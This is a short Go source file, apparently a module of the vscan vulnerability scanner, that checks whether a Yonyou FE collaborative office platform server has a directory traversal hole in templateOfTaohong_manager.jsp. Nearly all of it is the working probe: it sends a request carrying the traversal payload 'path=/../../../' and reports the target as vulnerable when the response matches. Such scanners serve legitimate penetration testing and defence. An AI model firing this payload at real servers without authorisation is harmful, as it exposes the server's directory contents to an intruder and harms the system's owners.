package yonyou

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)
//用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞


func TemplateOfTaohong_manager(u string) bool {
	if req, err := pkg.HttpRequset(u+"/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "TemplateOfTaohong") && strings.Contains(req.Body, "templateOfTaohong_manager") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou TemplateOfTaohong_manager|%s\n", u+"/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"))
			return true
		}
	}
	return false
}